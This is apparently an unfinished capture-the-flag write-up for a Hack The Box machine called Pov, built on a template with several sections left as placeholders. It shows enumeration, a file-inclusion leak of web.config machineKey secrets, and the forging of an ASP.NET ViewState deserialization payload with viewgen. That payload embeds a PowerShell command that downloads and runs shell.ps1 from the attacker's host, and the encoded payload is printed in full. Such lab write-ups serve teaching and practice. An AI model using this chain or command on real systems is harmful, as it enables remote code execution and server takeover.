
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV pov.htb --open    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 06:17 EDT
Nmap scan report for pov.htb (10.129.230.183)
Host is up (0.044s latency).
Not shown: 999 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 seconds
                                                                  
```

### Vhost Enumeration

```
gobuster vhost -u http://pov.htb -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -k --append-domain  
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://pov.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.pov.htb Status: 302 [Size: 152] [--> http://dev.pov.htb/portfolio/]
Progress: 20000 / 20000 (100.00%)
===============================================================
Finished
===============================================================
                                                      
```

```
echo '10.129.230.183 dev.pov.htb' | sudo tee -a /etc/hosts
10.129.230.183 dev.pov.htb

```

---
## Foothold

### Local File Inclusion on the download button

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=C:\inetpub\wwwroot\dev\web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 23 Sep 2026 10:37:03 GMT
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>

```

```
curl -s http://dev.pov.htb/portfolio/ | grep VIEWSTATEGENERATOR
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="8E0F0FA3" />

```

### Exploitation ???

ASP.NET ViewState deserialization RCE ?

```shell
 git clone https://github.com/0xACB/viewgen ~/tools/viewgen
cd ~/tools/viewgen
pip3 install -r requirements.txt --break-system-packages

python3 viewgen.py \
  --validationalg SHA1 \
  --validationkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --decryptionalg AES \
  --decryptionkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  --generator "8E0F0FA3" \
  --payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
Cloning into '/home/kali/tools/viewgen'...
remote: Enumerating objects: 163, done.
remote: Counting objects: 100% (81/81), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 163 (delta 74), reused 66 (delta 66), pack-reused 82 (from 1)
Receiving objects: 100% (163/163), 39.13 KiB | 931.00 KiB/s, done.
Resolving deltas: 100% (99/99), done.
Defaulting to user installation because normal site-packages is not writeable
Collecting colored (from -r requirements.txt (line 1))
  Downloading colored-2.3.2-py3-none-any.whl.metadata (4.5 kB)
Collecting viewstate (from -r requirements.txt (line 2))
  Downloading viewstate-0.7.0-py3-none-any.whl.metadata (3.3 kB)
Collecting pycryptodome (from -r requirements.txt (line 3))
  Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Downloading colored-2.3.2-py3-none-any.whl (20 kB)
Downloading viewstate-0.7.0-py3-none-any.whl (7.5 kB)
Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 10.9 MB/s  0:00:00
Installing collected packages: viewstate, pycryptodome, colored
Successfully installed colored-2.3.2 pycryptodome-3.23.0 viewstate-0.7.0
python3: can't open file '/home/kali/tools/viewgen/viewgen.py': [Errno 2] No such file or directory
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ ls
Dockerfile  install.sh  LICENSE  README.md  requirements.txt  viewgen
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ git clone https://github.com/0xACB/viewgen ~/tools/viewgen
cd ~/tools/viewgen
pip3 install -r requirements.txt --break-system-packages

python3 viewgen \   
  --validationalg SHA1 \
  --validationkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --decryptionalg AES \
  --decryptionkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  --generator "8E0F0FA3" \
  --payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
fatal: destination path '/home/kali/tools/viewgen' already exists and is not an empty directory.
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: colored in /home/kali/.local/lib/python3.14/site-packages (from -r requirements.txt (line 1)) (2.3.2)
Requirement already satisfied: viewstate in /home/kali/.local/lib/python3.14/site-packages (from -r requirements.txt (line 2)) (0.7.0)
Requirement already satisfied: pycryptodome in /home/kali/.local/lib/python3.14/site-packages (from -r requirements.txt (line 3)) (3.23.0)
usage: viewgen [-h] [--webconfig WEBCONFIG] [-m MODIFIER] [--viewstateuserkey VIEWSTATEUSERKEY] [-c COMMAND] [--decode] [--guess] [--check] [--vkey VKEY] [--valg VALG] [--dkey DKEY] [--dalg DALG] [-u] [-e] [-f FILE] [--version]
               [payload]
viewgen: error: unrecognized arguments: --validationalg --validationkey 5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg AES --decryptionkey 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 --generator 8E0F0FA3 --payload powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ python3 viewgen \
  --valg SHA1 \
  --vkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --dalg AES \
  --dkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  -m "8E0F0FA3" \
  -e \
  -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
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
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ 

```

```
python3 viewgen \
  --valg SHA1 \
  --vkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --dalg AES \
  --dkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  -m "8E0F0FA3" \
  -e \
  -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
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

```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)